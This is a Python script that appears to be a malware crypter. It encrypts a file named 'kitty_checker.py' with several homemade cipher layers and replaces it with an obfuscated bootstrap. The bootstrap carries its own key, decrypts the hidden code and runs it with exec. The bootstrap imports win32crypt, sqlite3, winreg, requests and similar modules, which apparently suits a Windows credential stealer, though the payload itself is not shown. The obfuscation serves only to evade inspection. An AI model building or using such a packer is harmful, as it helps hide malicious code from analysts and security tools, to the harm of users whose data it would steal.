import hashlib
import base64
import os
import sys
import zlib
import hmac
import random
import string

def _gen_password():
    chars = string.ascii_lowercase + string.digits
    length = random.randint(32, 64)
    return ''.join(random.choice(chars) for _ in range(length))

def _derive_key(password, salt, domain):
    k = hashlib.sha256(password + salt + domain).digest()
    for _ in range(19):
        k = hashlib.sha256(k + salt + domain).digest()
    k2 = hashlib.sha512(k + password + salt).digest()[:32]
    return hashlib.sha256(k2 + domain).digest()

def _keystream(key, nonce, length):
    ks = bytearray()
    ctr = 0
    while len(ks) < length:
        b = hashlib.sha256(key + nonce + ctr.to_bytes(16, 'big')).digest()
        b = hashlib.sha512(b + key).digest()[:32]
        ks.extend(b)
        ctr += 1
    return bytes(ks[:length])

def _xor(data, ks):
    return bytes(d ^ k for d, k in zip(data, ks))

def _rotate(data, key, nonce, direction):
    offsets = _keystream(key, nonce, len(data))
    return bytes((d + direction * o) % 256 for d, o in zip(data, offsets))

def _build_sbox(key):
    table = list(range(256))
    ks = _keystream(key, b'\x00' * 32, 512)
    for i in range(255, 0, -1):
        j = int.from_bytes(ks[i*2:i*2+2], 'big') % (i + 1)
        table[i], table[j] = table[j], table[i]
    return table

def _sbox_enc(data, sbox):
    return bytes(sbox[b] for b in data)

def _sbox_dec(data, inv_sbox):
    return bytes(inv_sbox[b] for b in data)

def _permute(data, key, nonce, encrypt):
    n = len(data)
    if n <= 1:
        return data
    indices = list(range(n))
    ks = _keystream(key, nonce, n * 4)
    for i in range(n - 1, 0, -1):
        j = int.from_bytes(ks[i*4:i*4+4], 'big') % (i + 1)
        indices[i], indices[j] = indices[j], indices[i]
    if encrypt:
        return bytes(data[indices[i]] for i in range(n))
    else:
        result = bytearray(n)
        for i in range(n):
            result[indices[i]] = data[i]
        return bytes(result)

def _encrypt(plaintext, password, salt):
    nonce = os.urandom(32)
    keys = [_derive_key(password, salt, bytes([i])) for i in range(10)]
    data = zlib.compress(plaintext, 9)
    sbox1 = _build_sbox(keys[0])
    data = _sbox_enc(data, sbox1)
    data = _xor(data, _keystream(keys[1], nonce, len(data)))
    data = _rotate(data, keys[2], nonce, 1)
    data = _permute(data, keys[3], nonce, True)
    data = _xor(data, _keystream(keys[4], nonce, len(data)))
    sbox2 = _build_sbox(keys[5])
    data = _sbox_enc(data, sbox2)
    data = _xor(data, _keystream(keys[6], nonce, len(data)))
    data = _rotate(data, keys[7], nonce, 1)
    data = _xor(data, _keystream(keys[8], nonce, len(data)))
    mac = hmac.new(keys[9], nonce + salt + data, hashlib.sha256).digest()
    return nonce + mac + data

def _decrypt(encrypted, password, salt):
    nonce = encrypted[:32]
    mac = encrypted[32:64]
    ct = encrypted[64:]
    keys = [_derive_key(password, salt, bytes([i])) for i in range(10)]
    expected = hmac.new(keys[9], nonce + salt + ct, hashlib.sha256).digest()
    if not hmac.compare_digest(mac, expected):
        raise ValueError("HMAC verification failed")
    data = _xor(ct, _keystream(keys[8], nonce, len(ct)))
    data = _rotate(data, keys[7], nonce, -1)
    data = _xor(data, _keystream(keys[6], nonce, len(data)))
    sbox2 = _build_sbox(keys[5])
    inv2 = [0] * 256
    for i in range(256):
        inv2[sbox2[i]] = i
    data = _sbox_dec(data, inv2)
    data = _xor(data, _keystream(keys[4], nonce, len(data)))
    data = _permute(data, keys[3], nonce, False)
    data = _rotate(data, keys[2], nonce, -1)
    data = _xor(data, _keystream(keys[1], nonce, len(data)))
    sbox1 = _build_sbox(keys[0])
    inv1 = [0] * 256
    for i in range(256):
        inv1[sbox1[i]] = i
    data = _sbox_dec(data, inv1)
    return zlib.decompress(data)

def _encrypt_password(password_bytes, secret, salt):
    nonce = os.urandom(32)
    key = _derive_key(secret, salt, b'\x00')
    ks = _keystream(key, nonce, len(password_bytes))
    enc = _xor(password_bytes, ks)
    return nonce + enc

def _decrypt_password(enc_pw, secret, salt):
    nonce = enc_pw[:32]
    ct = enc_pw[32:]
    key = _derive_key(secret, salt, b'\x00')
    ks = _keystream(key, nonce, len(ct))
    return _xor(ct, ks)

def _build_bootstrap(encoded_blob, salt_hex, enc_pw_hex, masked_hex, mask_hex):
    return f'''import hashlib as _h
import base64 as _b
import sys as _s
import zlib as _z
import hmac as _m
import json
import sqlite3
import shutil
import socket
import uuid
import platform
import time
import os
import subprocess
import ctypes
import ctypes.wintypes
import struct
import datetime
import winreg
import re
import glob
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import win32crypt
import requests

def _r(_p,_t,_d):
 _k=_h.sha256(_p+_t+_d).digest()
 for _ in range(19):
  _k=_h.sha256(_k+_t+_d).digest()
 _k2=_h.sha512(_k+_p+_t).digest()[:32]
 return _h.sha256(_k2+_d).digest()

def _g(_k,_n,_l):
 _ks=bytearray()
 _c=0
 while len(_ks)<_l:
  _x=_h.sha256(_k+_n+_c.to_bytes(16,'big')).digest()
  _x=_h.sha512(_x+_k).digest()[:32]
  _ks.extend(_x)
  _c+=1
 return bytes(_ks[:_l])

def _x(_d,_k):
 return bytes(_a^_b for _a,_b in zip(_d,_k))

def _rot(_d,_k,_n,_dir):
 _o=_g(_k,_n,len(_d))
 return bytes((_a+_dir*_b)%256 for _a,_b in zip(_d,_o))

def _sb(_k):
 _t=list(range(256))
 _ks=_g(_k,b'\\x00'*32,512)
 for _i in range(255,0,-1):
  _j=int.from_bytes(_ks[_i*2:_i*2+2],'big')%(_i+1)
  _t[_i],_t[_j]=_t[_j],_t[_i]
 return _t

def _pm(_d,_k,_n,_e):
 _l=len(_d)
 if _l<=1:return _d
 _ix=list(range(_l))
 _ks=_g(_k,_n,_l*4)
 for _i in range(_l-1,0,-1):
  _j=int.from_bytes(_ks[_i*4:_i*4+4],'big')%(_i+1)
  _ix[_i],_ix[_j]=_ix[_j],_ix[_i]
 if _e:return bytes(_d[_ix[_i]] for _i in range(_l))
 _r2=bytearray(_l)
 for _i in range(_l):_r2[_ix[_i]]=_d[_i]
 return bytes(_r2)

_t=bytes.fromhex("{salt_hex}")
_a1=bytes.fromhex("{masked_hex}")
_a2=bytes.fromhex("{mask_hex}")
_sk=bytes(_a^_b for _a,_b in zip(_a1,_a2))
_ep=bytes.fromhex("{enc_pw_hex}")
_pn=_ep[:32]
_ec=_ep[32:]
_pk=_r(_sk,_t,b'\\x00')
_p=_x(_ec,_g(_pk,_pn,len(_ec)))
_d=_b.b64decode("{encoded_blob}")
_n=_d[:32]
_mac=_d[32:64]
_c=_d[64:]
_ks=[_r(_p,_t,bytes([_i])) for _i in range(10)]
_em=_m.new(_ks[9],_n+_t+_c,_h.sha256).digest()
if not _m.compare_digest(_mac,_em):
 _s.exit(1)
_v=_x(_c,_g(_ks[8],_n,len(_c)))
_v=_rot(_v,_ks[7],_n,-1)
_v=_x(_v,_g(_ks[6],_n,len(_v)))
_s2=_sb(_ks[5])
_iv2=[0]*256
for _i in range(256):_iv2[_s2[_i]]=_i
_v=bytes(_iv2[_b] for _b in _v)
_v=_x(_v,_g(_ks[4],_n,len(_v)))
_v=_pm(_v,_ks[3],_n,False)
_v=_rot(_v,_ks[2],_n,-1)
_v=_x(_v,_g(_ks[1],_n,len(_v)))
_s1=_sb(_ks[0])
_iv1=[0]*256
for _i in range(256):_iv1[_s1[_i]]=_i
_v=bytes(_iv1[_b] for _b in _v)
exec(compile(_z.decompress(_v).decode('utf-8'),'<kitty>','exec'))
'''

def main():
    target = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'kitty_checker.py')
    with open(target, 'r', encoding='utf-8') as f:
        source = f.read()

    if 'bytes.fromhex' in source and '_b.b64decode(' in source:
        print("File is already encrypted. Skipping.")
        return

    password = _gen_password().encode('utf-8')
    salt = os.urandom(32)
    secret = os.urandom(32)
    mask = os.urandom(32)
    masked = bytes(a ^ b for a, b in zip(secret, mask))

    enc_pw = _encrypt_password(password, secret, salt)
    verify_pw = _decrypt_password(enc_pw, secret, salt)
    assert verify_pw == password, "Password encryption verification failed"

    encrypted = _encrypt(source.encode('utf-8'), password, salt)
    encoded = base64.b64encode(encrypted).decode('ascii')

    verify = _decrypt(encrypted, password, salt).decode('utf-8')
    assert verify == source, "Verification failed - decryption mismatch"

    bootstrap = _build_bootstrap(encoded, salt.hex(), enc_pw.hex(), masked.hex(), mask.hex())

    with open(target, 'w', encoding='utf-8') as f:
        f.write(bootstrap)

    print(f"Encrypted {len(source)} bytes -> {len(encoded)} base64 chars")
    print(f"Password: {password.decode('utf-8')} (hidden in bootstrap)")
    print(f"Salt: {salt.hex()[:16]}...")
    print(f"HMAC: verified")
    print(f"Compression: {len(source)} -> {len(zlib.compress(source.encode('utf-8'), 9))} bytes")
    print(f"Layers: zlib + S-box + XOR + rotate + permute + XOR + S-box + XOR + rotate + XOR")
    print(f"Key derivation: 20x SHA256 + SHA512 mixing, 10 domain-separated keys")
    print(f"Password protection: XOR encrypted with split secret (2 random halves)")
    print("Encryption complete.")

if __name__ == '__main__':
    main()
